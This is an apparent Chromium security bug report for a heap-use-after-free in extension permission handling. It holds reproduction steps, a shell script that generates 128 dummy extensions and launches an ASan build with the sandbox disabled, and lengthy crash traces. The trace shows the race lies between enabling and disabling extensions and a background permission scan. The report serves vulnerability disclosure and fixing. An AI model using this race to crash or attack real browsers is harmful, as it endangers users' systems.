# Security: heap-use-after-free in extensions::ExtensionInstallTimePermissionProvider::GetRuleIterator

| Field | Value |
|-------|-------|
| **Issue ID** | [507356235](https://issues.chromium.org/issues/507356235) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Platform>Extensions |
| **Platforms** | Mac |
| **Chrome Version** | 147.0.0.0 |
| **CVE IDs** | CVE-2026-8587 |
| **Reporter** | zh...@gmail.com |
| **Assignee** | jo...@chromium.org |
| **Created** | 2026-04-28 |
| **Bounty** | $6,000.00 |

## Description

# Steps to reproduce the problem

1. Download mac-release-arm64\_asan-mac-release-1621025
2. Prepare a clean directory and store these files there.On my computer, I selected `cd ~/Sites; mkdir fastcat-extension-registry-uaf-arm1621025;`

```
poc.html
serve.py
manager/manifest.json
manager/sw.js
manager/settings_toggle.js

```

- Check that the poc file is complete:

```
pwd
~/Sites/fastcat-extension-registry-uaf-arm1621025
ls -R
manager    poc.html   serve.py

./manager:
manifest.json      settings_toggle.js sw.js

```

3. setup http-server:

```
cd ~/Sites/fastcat-extension-registry-uaf-arm1621025
python3 serve.py --host 127.0.0.1 --port 9000

```

4. run asan mac chromium:

```
POC="/Users/zh1x1an1221/Sites/fastcat-extension-registry-uaf-arm1621025"
CHROMIUM="/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/MacOS/Chromium"
PROFILE="/tmp/fastcat-extension-registry-uaf-sites-profile"

rm -rf "$PROFILE" "$POC/targets"
mkdir -p "$POC/targets"

for n in {0..127}; do
  DIR="$(printf "%s/targets/t%04d" "$POC" "$n")"
  mkdir -p "$DIR"
  printf '{"manifest_version":3,"name":"FastCat Registry Race Target %04d","version":"1.0","permissions":["geolocation","notifications"]}\n' "$n" > "$DIR/manifest.json"
done

EXTS="$POC/manager"
for n in {0..127}; do
  EXTS="$EXTS,$(printf "%s/targets/t%04d" "$POC" "$n")"
done

"$CHROMIUM" \
  --no-sandbox \
  --user-data-dir="$PROFILE" \
  --disable-breakpad \
  --no-first-run \
  --no-default-browser-check \
  --enable-logging=stderr \
  --disable-popup-blocking \
  --disable-background-timer-throttling \
  --disable-renderer-backgrounding \
  --extensions-on-chrome-urls \
  --load-extension="$EXTS" \
  http://127.0.0.1:9000/poc.html

```
# Problem Description

RCA and BISECT coming soon!

# Summary

Security: heap-use-after-free in extensions::ExtensionInstallTimePermissionProvider::GetRuleIterator

# Custom Questions

#### Type of crash:

browser

#### Crash state:

```
=================================================================
==41907==ERROR: AddressSanitizer: heap-use-after-free on address 0x606000277708 at pc 0x00035625eaa8 bp 0x000173d6e370 sp 0x000173d6e368
READ of size 8 at 0x606000277708 thread T14
==41907==WARNING: invalid path to external symbolizer!
==41907==WARNING: Failed to use and restart external symbolizer!
    #0 0x00035625eaa4 in extensions::ExtensionInstallTimePermissionProvider::GetRuleIterator(content_settings::mojom::ContentSettingsType, bool) const+0x44c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb3f2aa4)
    #1 0x0003661c259c in HostContentSettingsMap::AddSettingsForOneType(content_settings::ProviderInterface const*, content_settings::mojom::ProviderType, content_settings::mojom::ContentSettingsType, std::__Cr::vector<ContentSettingPatternSource, std::__Cr::allocator<ContentSettingPatternSource>>*, bool, std::__Cr::optional<content_settings::mojom::SessionModel>) const+0x11c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1b35659c)
    #2 0x0003661c239c in HostContentSettingsMap::GetSettingsForOneType(content_settings::mojom::ContentSettingsType, std::__Cr::optional<content_settings::mojom::SessionModel>) const+0x134 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1b35639c)
    #3 0x00035c3613d8 in UnusedSitePermissionsManager::UpdateOnBackgroundThread(base::Clock*, scoped_refptr<HostContentSettingsMap>, bool)+0x3ec (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x114f53d8)
    #4 0x00035c35ad84 in base::internal::Invoker<base::internal::FunctorTraits<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>> (*&&)(base::Clock*, scoped_refptr<HostContentSettingsMap>, bool), base::raw_ptr<base::Clock, (partition_alloc::internal::RawPtrTraits)0>&&, scoped_refptr<HostContentSettingsMap>&&, bool&&>, base::internal::BindState<false, true, false, std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>> (*)(base::Clock*, scoped_refptr<HostContentSettingsMap>, bool), base::internal::UnretainedWrapper<base::Clock, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>, scoped_refptr<HostContentSettingsMap>, bool>, std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>> ()>::RunOnce(base::internal::BindStateBase*)+0x1ac (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x114eed84)
    #5 0x00035c35e398 in void base::internal::ReturnAsParamAdapter<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>, std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>(base::OnceCallback<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>> ()>, std::__Cr::unique_ptr<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>, std::__Cr::default_delete<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>>>*)+0x13c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x114f2398)
    #6 0x00035c35e9b0 in base::internal::Invoker<base::internal::FunctorTraits<void (*&&)(base::OnceCallback<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>> ()>, std::__Cr::unique_ptr<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>, std::__Cr::default_delete<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>>>*), base::OnceCallback<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>> ()>&&, std::__Cr::unique_ptr<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>, std::__Cr::default_delete<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>>>*&&>, base::internal::BindState<false, true, false, void (*)(base::OnceCallback<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>> ()>, std::__Cr::unique_ptr<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>, std::__Cr::default_delete<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>>>*), base::OnceCallback<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>> ()>, base::internal::UnretainedWrapper<std::__Cr::unique_ptr<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>, std::__Cr::default_delete<std::__Cr::tuple<std::__Cr::unique_ptr<SafetyHubResult, std::__Cr::default_delete<SafetyHubResult>>>>>, base::unretained_traits::MayNotDangle, (partition_alloc::internal::RawPtrTraits)0>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x198 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x114f29b0)
    #7 0x00035daf2848 in base::internal::PostTaskAndReplyRelay::RunTaskAndPostReply(base::internal::PostTaskAndReplyRelay)+0x144 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c86848)
    #8 0x00035daf2d10 in base::internal::Invoker<base::internal::FunctorTraits<void (*&&)(base::internal::PostTaskAndReplyRelay), base::internal::PostTaskAndReplyRelay&&>, base::internal::BindState<false, true, false, void (*)(base::internal::PostTaskAndReplyRelay), base::internal::PostTaskAndReplyRelay>, void ()>::RunOnce(base::internal::BindStateBase*)+0x110 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c86d10)
    #9 0x00035da7a678 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x360 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c0e678)
    #10 0x00035dafdff8 in base::internal::TaskTracker::RunTaskImpl(base::internal::Task&, base::TaskTraits const&, base::internal::TaskSource*, base::internal::SequenceToken const&)+0x1f0 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c91ff8)
    #11 0x00035dafe244 in base::internal::TaskTracker::RunSkipOnShutdown(base::internal::Task&, base::TaskTraits const&, base::internal::TaskSource*, base::internal::SequenceToken const&)+0xec (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c92244)
    #12 0x00035dafcc04 in base::internal::TaskTracker::RunTask(base::internal::Task, base::internal::TaskSource*, base::TaskTraits const&, base::ThreadType)+0x3f4 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c90c04)
    #13 0x00035dafbfd8 in base::internal::TaskTracker::RunAndPopNextTask(base::internal::RegisteredTaskSource)+0x540 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c8ffd8)
    #14 0x00035db385d4 in base::internal::WorkerThread::RunWorker()+0x828 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12ccc5d4)
    #15 0x00035db376d8 in base::internal::WorkerThread::RunBackgroundPooledWorker()+0xac (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12ccb6d8)
    #16 0x00035db374bc in base::internal::WorkerThread::ThreadMain()+0x24c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12ccb4bc)
    #17 0x00035dbaccf8 in base::(anonymous namespace)::ThreadFunc(void*)+0x154 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12d40cf8)
    #18 0x00010074d99c in __sanitizer_weak_hook_memcmp+0x36694 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x5199c)
    #19 0x000189283c54 in _pthread_start+0x84 (/usr/lib/system/libsystem_pthread.dylib:arm64e+0x6c54)
    #20 0x00018927ec18 in thread_start+0x4 (/usr/lib/system/libsystem_pthread.dylib:arm64e+0x1c18)

0x606000277708 is located 8 bytes inside of 64-byte region [0x606000277700,0x606000277740)
freed by thread T0 here:
    #0 0x000100751184 in __asan_memmove+0x3078 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x55184)
    #1 0x00036590fb0c in std::__Cr::__tree<std::__Cr::__value_type<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>, scoped_refptr<extensions::Extension const>>, std::__Cr::__map_value_compare<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>, std::__Cr::pair<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const, scoped_refptr<extensions::Extension const>>, std::__Cr::less<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>>>, std::__Cr::allocator<std::__Cr::pair<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const, scoped_refptr<extensions::Extension const>>>>::erase(std::__Cr::__tree_const_iterator<std::__Cr::__value_type<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>, scoped_refptr<extensions::Extension const>>, std::__Cr::__tree_node<std::__Cr::__value_type<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>, scoped_refptr<extensions::Extension const>>, void*>*, long>)+0x190 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1aaa3b0c)
    #2 0x00036590db5c in extensions::ExtensionSet::Remove(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&)+0x19c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1aaa1b5c)
    #3 0x000356370d7c in extensions::ExtensionRegistrar::DisableExtensionWithRawReasons(extensions::ExtensionPrefs::DisableReasonRawManipulationPasskey, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, base::internal::flat_tree<int, std::__Cr::identity, std::__Cr::less<void>, std::__Cr::vector<int, std::__Cr::allocator<int>>>)+0x508 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb504d7c)
    #4 0x000356371750 in extensions::ExtensionRegistrar::DisableExtensionWithSource(extensions::Extension const*, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, extensions::disable_reason::DisableReason)+0x218 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb505750)
    #5 0x00035907b114 in extensions::ChromeManagementAPIDelegate::DisableExtension(content::BrowserContext*, extensions::Extension const*, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, extensions::disable_reason::DisableReason) const+0x134 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xe20f114)
    #6 0x000356cc9400 in extensions::ManagementSetEnabledFunction::Run()+0xa4c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xbe5d400)
    #7 0x0003563004b4 in ExtensionFunction::RunWithValidation()+0x1b8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb4944b4)
    #8 0x00035630eeb0 in extensions::ExtensionFunctionDispatcher::DispatchWithCallbackInternal(mojo::StructPtr<extensions::mojom::RequestParams>, content::RenderFrameHost*, content::RenderProcessHost&, base::OnceCallback<void (ExtensionFunction::ResponseType, base::ListValue, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, mojo::StructPtr<extensions::mojom::ExtraResponseData>)>)+0xf10 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb4a2eb0)
    #9 0x00035630f9d0 in extensions::ExtensionFunctionDispatcher::DispatchForServiceWorker(mojo::StructPtr<extensions::mojom::RequestParams>, int, base::OnceCallback<void (bool, base::ListValue, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, mojo::StructPtr<extensions::mojom::ExtraResponseData>)>)+0x3d8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb4a39d0)
    #10 0x000356482a10 in extensions::ServiceWorkerHost::RequestWorker(mojo::StructPtr<extensions::mojom::RequestParams>, base::OnceCallback<void (bool, base::ListValue, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, mojo::StructPtr<extensions::mojom::ExtraResponseData>)>)+0x244 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb616a10)
    #11 0x0003565ea5b4 in extensions::mojom::ServiceWorkerHostStubDispatch::AcceptWithResponder(extensions::mojom::ServiceWorkerHost*, mojo::Message*, std::__Cr::unique_ptr<mojo::MessageReceiverWithStatus, std::__Cr::default_delete<mojo::MessageReceiverWithStatus>>)+0x28c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb77e5b4)
    #12 0x00035e1769b4 in mojo::InterfaceEndpointClient::HandleValidatedMessage(mojo::Message*)+0x8b8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1330a9b4)
    #13 0x00035e18b808 in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f0 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1331f808)
    #14 0x00035e17bbdc in mojo::InterfaceEndpointClient::HandleIncomingMessage(mojo::Message*)+0x148 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1330fbdc)
    #15 0x00035e19852c in mojo::internal::MultiplexRouter::ProcessIncomingMessage(mojo::internal::MultiplexRouter::MessageWrapper*, mojo::internal::MultiplexRouter::ClientCallBehavior, base::SequencedTaskRunner*)+0x624 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1332c52c)
    #16 0x00035e197004 in mojo::internal::MultiplexRouter::Accept(mojo::Message*)+0x554 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1332b004)
    #17 0x00035e18b808 in mojo::MessageDispatcher::Accept(mojo::Message*)+0x2f0 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1331f808)
    #18 0x00035e169bd0 in mojo::Connector::DispatchMessage(mojo::ScopedHandleBase<mojo::MessageHandle>)+0x37c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x132fdbd0)
    #19 0x00035e16b0e8 in mojo::Connector::ReadAllAvailableMessages()+0x234 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x132ff0e8)
    #20 0x00035e16ba60 in base::internal::Invoker<base::internal::FunctorTraits<void (mojo::Connector::*&&)(), base::WeakPtr<mojo::Connector>&&>, base::internal::BindState<true, true, false, void (mojo::Connector::*)(), base::WeakPtr<mojo::Connector>>, void ()>::RunOnce(base::internal::BindStateBase*)+0x15c (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x132ffa60)
    #21 0x00035da7a678 in base::TaskAnnotator::RunTaskImpl(base::PendingTask&)+0x360 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c0e678)
    #22 0x00035dadd444 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl(base::LazyNow*)+0x8f8 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c71444)
    #23 0x00035dadc794 in base::sequence_manager::internal::ThreadControllerWithMessagePumpImpl::DoWork()+0x138 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12c70794)
    #24 0x00035dbfd604 in base::MessagePumpCFRunLoopBase::RunWork()+0x1c0 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12d91604)
    #25 0x00035dbeee1c in base::apple::CallWithEHFrame(void () block_pointer)+0xc (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12d82e1c)
    #26 0x00035dbfba84 in base::MessagePumpCFRunLoopBase::RunWorkSource(void*)+0xe4 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x12d8fa84)
    #27 0x000189340bbc in __CFRUNLOOP_IS_CALLING_OUT_TO_A_SOURCE0_PERFORM_FUNCTION__+0x18 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7dbbc)
    #28 0x000189340b50 in __CFRunLoopDoSource0+0xa8 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7db50)
    #29 0x0001893408bc in __CFRunLoopDoSources0+0xe4 (/System/Library/Frameworks/CoreFoundation.framework/Versions/A/CoreFoundation:arm64e+0x7d8bc)

previously allocated by thread T0 here:
    #0 0x000100751094 in __asan_memmove+0x2f88 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/MacOS/libclang_rt.asan_osx_dynamic.dylib:arm64+0x55094)
    #1 0x00037452cad4 in operator new(unsigned long)+0x18 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x296c0ad4)
    #2 0x00036590f4f4 in std::__Cr::pair<std::__Cr::__tree_iterator<std::__Cr::__value_type<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>, scoped_refptr<extensions::Extension const>>, std::__Cr::__tree_node<std::__Cr::__value_type<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>, scoped_refptr<extensions::Extension const>>, void*>*, long>, bool> std::__Cr::__tree<std::__Cr::__value_type<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>, scoped_refptr<extensions::Extension const>>, std::__Cr::__map_value_compare<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>, std::__Cr::pair<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const, scoped_refptr<extensions::Extension const>>, std::__Cr::less<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>>>>, std::__Cr::allocator<std::__Cr::pair<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const, scoped_refptr<extensions::Extension const>>>>::__emplace_unique<std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, scoped_refptr<extensions::Extension const> const&>(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, scoped_refptr<extensions::Extension const> const&)::'lambda'(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, scoped_refptr<extensions::Extension const> const&)::operator()(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&, scoped_refptr<extensions::Extension const> const&) const+0x190 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1aaa34f4)
    #3 0x00036590d568 in extensions::ExtensionSet::Insert(scoped_refptr<extensions::Extension const> const&)+0x248 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0x1aaa1568)
    #4 0x0003563701ec in extensions::ExtensionRegistrar::EnableExtension(std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&)+0x384 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xb5041ec)
    #5 0x00035907adac in extensions::ChromeManagementAPIDelegate::EnableExtension(content::BrowserContext*, std::__Cr::basic_string<char, std::__Cr::char_traits<char>, std::__Cr::allocator<char>> const&) const+0x180 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xe20edac)
    #6 0x000356ccb8b4 in extensions::ManagementSetEnabledFunction::OnManifestV2DeprecationChecked(bool)+0x184 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xbe5f8b4)
    #7 0x000356ccb51c in extensions::ManagementSetEnabledFunction::CheckManifestV2Deprecation()+0x310 (/Users/zh1x1an1221/collection-mac-asan-chromium/mac-release-arm64_asan-mac-release-1621025/Chromium.app/Contents/Frameworks/Chromium Framework.framework/Versions/149.0.7812.0/Chromium Framework:arm64+0xbe5f51c)
